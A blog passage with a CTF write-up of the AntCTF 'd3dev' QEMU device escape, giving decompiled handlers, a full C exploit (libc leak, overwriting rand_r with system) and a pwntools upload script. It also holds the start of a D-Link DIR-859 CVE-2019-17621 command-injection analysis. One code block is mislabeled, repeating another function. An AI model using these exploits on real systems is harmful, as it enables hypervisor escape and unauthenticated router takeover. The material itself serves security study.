<h2 id="0x02-2021-AntCtf-d3dev"><a href="#0x02-2021-AntCtf-d3dev" class="headerlink" title="0x02 2021 AntCtf d3dev"></a>0x02 2021 AntCtf d3dev</h2><h3 id="2-1-设备分析"><a href="#2-1-设备分析" class="headerlink" title="2.1 设备分析"></a>2.1 设备分析</h3><p>首先可以通过d3dev_class_init来判断它是哪个设备，与lspci列表下的设备对比，发现对应设备是<code>/sys/devices/pci0000:00/0000:00:03.0</code></p>
<p>然后一般来讲，设备的数据类型IDA是没有自动加载的，需要我们手动加载一下。在IDA-&gt;views-&gt;subview-&gt;localtype里搜索 d3 可以找到这个设备结构体，用了这个结构体以后代码就好看很多了。</p>
<p><img src="/07/cl7iordq0003v293fwbdjxa27/2.png" alt></p>
<h3 id="2-2-漏洞分析"><a href="#2-2-漏洞分析" class="headerlink" title="2.2 漏洞分析"></a>2.2 漏洞分析</h3><h4 id="pmio-write"><a href="#pmio-write" class="headerlink" title="pmio_write"></a>pmio_write</h4><p>首先看pmio_write函数，主要功能就四个</p>
<ul>
<li>addr为8时设置seek</li>
<li>addr为28时调用r_rand函数</li>
<li>addr为4时将key重置</li>
<li>设置memory_mode</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void __fastcall d3dev_pmio_write(d3devState *opaque, hwaddr addr, uint64_t val, unsigned int size)</span><br><span class="line">&#123;</span><br><span class="line">  uint32_t *v4; // rbp</span><br><span class="line"></span><br><span class="line">  if ( addr == 8 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( val &lt;= 0x100 )</span><br><span class="line">      opaque-&gt;seek = val;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( addr &gt; 8 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( addr == 28 )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;r_seed = val;</span><br><span class="line">      v4 = opaque-&gt;key;</span><br><span class="line">      do</span><br><span class="line">        *v4++ = ((__int64 (__fastcall *)(uint32_t *, __int64, uint64_t, _QWORD))opaque-&gt;rand_r)(</span><br><span class="line">                  &amp;opaque-&gt;r_seed,</span><br><span class="line">                  28LL,</span><br><span class="line">                  val,</span><br><span class="line">                  *(_QWORD *)&amp;size);</span><br><span class="line">      while ( v4 != (uint32_t *)&amp;opaque-&gt;rand_r );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( addr )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( addr == 4 )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)opaque-&gt;key = 0LL;</span><br><span class="line">      *(_QWORD *)&amp;opaque-&gt;key[2] = 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;memory_mode = val;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="pmio-read"><a href="#pmio-read" class="headerlink" title="pmio_read"></a>pmio_read</h4><p>然后再分析pmio_read函数，这个函数朴实无华，功能也十分简单。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> __fastcall <span class="title">d3dev_pmio_read</span><span class="params">(<span class="keyword">void</span> *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( addr &gt; <span class="number">0x18</span> )</span><br><span class="line">    result = <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = ((__int64 (__fastcall *)(<span class="keyword">void</span> *))((<span class="keyword">char</span> *)dword_7ADF30 + dword_7ADF30[addr]))(opaque);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入到dword_7ADF30之后算一下偏移发现是一串gadget，基本上的功能就是读那个设备结构体的一些值，比如seek，key之类的。</p>
<h4 id="mmio-write"><a href="#mmio-write" class="headerlink" title="mmio_write"></a>mmio_write</h4><p>这个有一个越界写漏洞，出现在设置v4这个index的时候这个seek是我们自主可控的，因此会造成越界写。还有一点需要注意的就是，它那个do while实际上是一个解密的过程。x是低32位，y是高32位。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">d3dev_mmio_write</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rsi</span></span><br><span class="line">  ObjectClass_0 **v5; <span class="comment">// r11</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v6; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">uint32_t</span> key0; <span class="comment">// er10</span></span><br><span class="line">  <span class="keyword">uint32_t</span> key1; <span class="comment">// er9</span></span><br><span class="line">  <span class="keyword">uint32_t</span> key2; <span class="comment">// er8</span></span><br><span class="line">  <span class="keyword">uint32_t</span> key3; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> x; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">uint64_t</span> y; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = opaque-&gt;seek + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(addr &gt;&gt; <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> ( opaque-&gt;mmio_write_part )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = &amp;opaque-&gt;pdev.qdev.parent_obj.class + v4;</span><br><span class="line">      v6 = val &lt;&lt; <span class="number">32</span>;</span><br><span class="line">      i = <span class="number">0</span>;</span><br><span class="line">      opaque-&gt;mmio_write_part = <span class="number">0</span>;</span><br><span class="line">      key0 = opaque-&gt;key[<span class="number">0</span>];</span><br><span class="line">      key1 = opaque-&gt;key[<span class="number">1</span>];</span><br><span class="line">      key2 = opaque-&gt;key[<span class="number">2</span>];</span><br><span class="line">      key3 = opaque-&gt;key[<span class="number">3</span>];</span><br><span class="line">      x = v6 + *((_DWORD *)v5 + <span class="number">0x2B6</span>);</span><br><span class="line">      y = ((<span class="keyword">unsigned</span> __int64)v5[<span class="number">0x15B</span>] + v6) &gt;&gt; <span class="number">32</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        i -= <span class="number">0x61C88647</span>;</span><br><span class="line">        x += (i + y) ^ (key1 + ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)y &gt;&gt; <span class="number">5</span>)) ^ (key0 + <span class="number">16</span> * y);</span><br><span class="line">        LODWORD(y) = ((i + x) ^ (key3 + (x &gt;&gt; <span class="number">5</span>)) ^ (key2 + <span class="number">16</span> * x)) + y;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( i != <span class="number">0xC6EF3720</span> );                <span class="comment">// range(20)</span></span><br><span class="line">      v5[<span class="number">0x15B</span>] = (ObjectClass_0 *)__PAIR64__(y, x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;mmio_write_part = <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;blocks[v4] = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="mmio-read"><a href="#mmio-read" class="headerlink" title="mmio_read"></a>mmio_read</h4><p>这个地方跟上面的越界写一样，就是个越界读。然后还会把读出的数据进行一个加密。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">d3dev_pmio_write</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> *v4; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( val &lt;= <span class="number">0x100</span> )</span><br><span class="line">      opaque-&gt;seek = val;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr &gt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">28</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;r_seed = val;</span><br><span class="line">      v4 = opaque-&gt;key;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        *v4++ = ((__int64 (__fastcall *)(<span class="keyword">uint32_t</span> *, __int64, <span class="keyword">uint64_t</span>, _QWORD))opaque-&gt;rand_r)(</span><br><span class="line">                  &amp;opaque-&gt;r_seed,</span><br><span class="line">                  <span class="number">28L</span>L,</span><br><span class="line">                  val,</span><br><span class="line">                  *(_QWORD *)&amp;size);</span><br><span class="line">      <span class="keyword">while</span> ( v4 != (<span class="keyword">uint32_t</span> *)&amp;opaque-&gt;rand_r );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)opaque-&gt;key = <span class="number">0L</span>L;</span><br><span class="line">      *(_QWORD *)&amp;opaque-&gt;key[<span class="number">2</span>] = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;memory_mode = val;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-3-利用思路"><a href="#2-3-利用思路" class="headerlink" title="2.3 利用思路"></a>2.3 利用思路</h3><ol>
<li>利用越界读读出rand_r的地址，算出libc地址</li>
<li>利用越界写将system地址写入rand_r的位置</li>
<li>将原来seek的位置以及后面的block写入cat flag命令</li>
<li>利用pmio_write调用rand_r从而实现命令执行</li>
</ol>
<h3 id="2-4-本地调试"><a href="#2-4-本地调试" class="headerlink" title="2.4 本地调试"></a>2.4 本地调试</h3><p>解压</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cpio -idmv &lt; rootfs.img</span><br></pre></td></tr></table></figure>

<p>编译写好的exp</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -O0 -o exp -static d3dev.c</span><br></pre></td></tr></table></figure>

<p>将写好的二进制文件编译后打包入rootfs.img中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.img</span><br></pre></td></tr></table></figure>

<p>然后直接运行它的laungh.sh就行了</p>
<p>我在20.04的环境下可以直接运行起来,然后<code>ps -ax</code>查看当前有哪些进程，使用gdb attach对应的进程就可以进行相应的调试了</p>
<blockquote>
<p>调试时查看结构体可以在d3dev相关函数断点下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;p *((d3devState *)$rdi)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>就可以查看了</p>
</blockquote>
<h2 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"><span class="keyword">uint32_t</span> pmio_base = <span class="number">0xc040</span>; <span class="comment">//cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource</span></span><br><span class="line"><span class="keyword">uint32_t</span> keys[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">uint64_t</span> libc_base ;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outl(value,addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint32_t</span>)inl(addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_arbread</span><span class="params">(<span class="keyword">uint32_t</span> offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pmio_write(pmio_base+<span class="number">0</span>,offset);</span><br><span class="line">    <span class="keyword">return</span> pmio_read(pmio_base+<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_abwrite</span><span class="params">(<span class="keyword">uint32_t</span> offset, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pmio_write(pmio_base+<span class="number">0</span>,offset);</span><br><span class="line">    pmio_write(pmio_base+<span class="number">4</span>,value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reset_keys</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> seed = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;<span class="number">4</span>;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        keys[i] = rand_r(&amp;seed);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"keys[%d] test = %p\n"</span>,i, keys[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    pmio_write(<span class="number">28</span> + pmio_base,<span class="number">0</span>);</span><br><span class="line">    pmio_write(<span class="number">4</span> + pmio_base,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_seek_off</span><span class="params">(<span class="keyword">uint32_t</span> offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pmio_write(<span class="number">8</span> + pmio_base,offset);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">uint32_t</span> x, <span class="keyword">uint64_t</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        i -=<span class="number">0x61C88647</span>;</span><br><span class="line">        x += (i + y) ^ ( ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)y &gt;&gt; <span class="number">5</span>)) ^ (  y &lt;&lt; <span class="number">4</span>);</span><br><span class="line">        y = (<span class="keyword">uint32_t</span>)(((i + x) ^ ((x &gt;&gt; <span class="number">5</span>)) ^ (  x &lt;&lt; <span class="number">4</span>)) + y);</span><br><span class="line">    &#125; <span class="keyword">while</span> (i != <span class="number">0xC6EF3720</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"x = %p, y = %p , i = %p\n"</span>,x,y,i);</span><br><span class="line">    <span class="keyword">uint64_t</span> ans = (y &lt;&lt; <span class="number">32</span>) + x;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ans = %p\n"</span>,ans);</span><br><span class="line">    <span class="keyword">return</span> ans - <span class="number">0x4AEB0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">uint64_t</span> rr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> i , x ;</span><br><span class="line">    <span class="keyword">uint64_t</span> y;</span><br><span class="line"></span><br><span class="line">    i  = <span class="number">0xC6EF3720</span>;</span><br><span class="line">    x = rr &amp; <span class="number">0xffffffff</span> ; </span><br><span class="line">    y = rr &gt;&gt; <span class="number">32</span> ;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        y = (<span class="keyword">uint32_t</span>)(y - ((x + i) ^ (x &gt;&gt; <span class="number">5</span>) ^ ( x &lt;&lt; <span class="number">4</span> )));</span><br><span class="line">        x = x - (((y + i) ^ (y &gt;&gt; <span class="number">5</span>) ^ ( y &lt;&lt; <span class="number">4</span> ) )) ;</span><br><span class="line">        i = i + <span class="number">0x61C88647</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span> (i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"x = %p, y = %p , i = %p\n"</span>,x,y,i);</span><br><span class="line">    <span class="keyword">return</span>  (y &lt;&lt; <span class="number">32</span>) + x;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> tmp = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> tmp1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> tmp2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:03.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">"mmio_fd open failed"</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">"mmap mmio_mem failed"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mmio_mem @ %p\n"</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    tmp = mmio_read(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"tmp test = %p\n"</span>, tmp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )</span><br><span class="line">        die(<span class="string">"I/O permission is not enough"</span>);</span><br><span class="line"></span><br><span class="line">    reset_keys();</span><br><span class="line">    set_seek_off(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">// get rand_r </span></span><br><span class="line">    <span class="keyword">uint64_t</span> yy;</span><br><span class="line">    <span class="keyword">uint32_t</span> xx;</span><br><span class="line">    yy = mmio_read(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"tmp1 test = %p\n"</span>, yy); <span class="comment">// part 1</span></span><br><span class="line">    xx = mmio_read(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"tmp2 test = %p\n"</span>, xx); <span class="comment">// part 2 high</span></span><br><span class="line">    libc_base = decrypt(xx,yy);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"libc_base = %p\n"</span>,libc_base);</span><br><span class="line">    <span class="keyword">uint64_t</span> system = libc_base + <span class="number">0x0000000000055410</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"system = %p\n"</span>,system);</span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">24</span>, (<span class="keyword">uint32_t</span>)(encrypt(system)));</span><br><span class="line">    mmio_write(<span class="number">24</span>, (<span class="keyword">uint32_t</span>)(encrypt(system) &gt;&gt; <span class="number">32</span>));</span><br><span class="line">    <span class="comment">// char sed[4] = "cat ";</span></span><br><span class="line">    <span class="comment">// char flag[8] = "/home/ct";</span></span><br><span class="line">    <span class="comment">// char flag2[8] = "f/flag\x00";</span></span><br><span class="line">    <span class="keyword">uint32_t</span> flag1 = <span class="number">0x20746163</span>; <span class="comment">//"cat "</span></span><br><span class="line">    <span class="keyword">uint64_t</span> flag2 = <span class="number">0x67616c66</span>; <span class="comment">// "flag"</span></span><br><span class="line">    <span class="comment">// uint64_t flag3 = 0x67616c662f66;</span></span><br><span class="line">    set_seek_off(<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">0</span>, (<span class="keyword">uint32_t</span>)(encrypt(flag2)));</span><br><span class="line">    mmio_write(<span class="number">0</span>, (<span class="keyword">uint32_t</span>)(encrypt(flag2) &gt;&gt; <span class="number">32</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// mmio_write(8, (uint32_t)(encrypt(flag3)));</span></span><br><span class="line">    <span class="comment">// mmio_write(8, (uint32_t)(encrypt(flag3) &gt;&gt; 32));</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">28</span> + pmio_base,flag1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x04-远程exp"><a href="#0x04-远程exp" class="headerlink" title="0x04 远程exp"></a>0x04 远程exp</h2><p>模板来自[这里]([[Pwn 笔记]Linux Kernel 调试文件总结 | binLep’s Blog](<a href="https://binlep.github.io/2020/03/12/[Pwn" target="_blank" rel="noopener">https://binlep.github.io/2020/03/12/[Pwn</a> 笔记]Linux Kernel 调试文件总结/))</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">cmd = <span class="string">'/ #'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(r)</span>:</span></span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'stty -echo'</span>)</span><br><span class="line">    os.system(<span class="string">'gcc -static -O0 ./d3dev.c -o ./exp'</span>)</span><br><span class="line">    os.system(<span class="string">'gzip -c ./exp &gt; ./exp.gz'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'cat &lt;&lt;EOF &gt; exp.gz.b64'</span>)</span><br><span class="line">    r.sendline((read(<span class="string">'./exp.gz'</span>)).encode(<span class="string">'base64'</span>))</span><br><span class="line">    r.sendline(<span class="string">'EOF'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'base64 -d exp.gz.b64 &gt; exp.gz'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'gunzip ./exp.gz'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'chmod +x ./exp'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'./exp'</span>)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process('./startvm.sh', shell=True)</span></span><br><span class="line">p = remote(<span class="string">'106.14.216.214'</span>,<span class="number">50273</span>)</span><br><span class="line"></span><br><span class="line">exploit(p)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>qemu</tag>
      </tags>
  </entry>
  <entry>
    <title>D-Link DIR-859 及其系列上存在的ssdpcgi未认证命令执行漏洞(CVE-2019–17621)</title>
    <url>/year/02/05/cl7iordoo000q293fa5vmd03a/</url>
    <content><![CDATA[<p>最近打算针对一个类型的漏洞进行仔细的分析，希望能通过这个漏洞的分析总结归纳出具有这个漏洞的设备的特点，利于指导之后的漏洞挖掘。<br>目前的分析思路：<br>    1. 首先分析该漏洞在DIR-859上的形成原因，利用思路。<br>        2. 查看其他受影响的设备漏洞形成原因和利用方式与该DIR-859上有何不同<br>        3. 研究官方补丁，看看官方如何修补该漏洞<br>        4. 研究除了DLINk系列，其他系列的设备处理SSDP的流程是否也存在类似问题</p>
<a id="more"></a>

<h3 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h3><p>主要是在ssdpcgi函数中发现了该漏洞，且因为SSDP协议缘故，该漏洞利用无须通过认证<br>漏洞起因主要是因为环境变量没有进行字符过滤</p>
<ol>
<li><p>漏洞研究版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">型号：DIR-859</span><br><span class="line">固件版本：1.06b01 Beta01，1.05</span><br><span class="line">架构：MIPS 32位</span><br></pre></td></tr></table></figure>
</li>
<li><p>目前搜集到的受影响的Dlink版本<br><img src="/05/cl7iordoo000q293fa5vmd03a/1.png" alt></p>
<h3 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h3><p>首先分析一下这个ssdpcgi函数的逻辑<br>首先是a1,也就是参数个数。随后获取了四个环境变量<br><img src="/05/cl7iordoo000q293fa5vmd03a/2.png" alt="ccad2c09a97638c032bb6c7814e2e0b7.png"><br>HTTP_ST这个字段主要是关系到搜索的方式，根据函数逻辑一共有4种发现设备的方式</p>
</li>
<li><p>ssdp:all 搜索所有的UPnP设备以及服务</p>
</li>
<li><p>upnp:rootdevice：搜索root设备</p>
</li>
<li><p>uuid: 查询特定uuid的设备</p>
</li>
<li><p>urn: 查询指定类型的设备</p>
</li>
</ol>
<p>以下是四种情况的处理流程，可以看到最终都会执行lxmldbc_system这个函数来执行M-SEARCH.sh这个脚本来查询设备<br>最后执行的命令基本格式就是两种，xxxx就是可以注入的位置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/scripts/upnp/M-SEARCH.sh ssdpall adddr:port id &amp;</span><br><span class="line">/etc/scripts/upnp/M-SEARCH.sh uuid adddr:port id uuid:xxxxxx&amp;</span><br></pre></td></tr></table></figure>

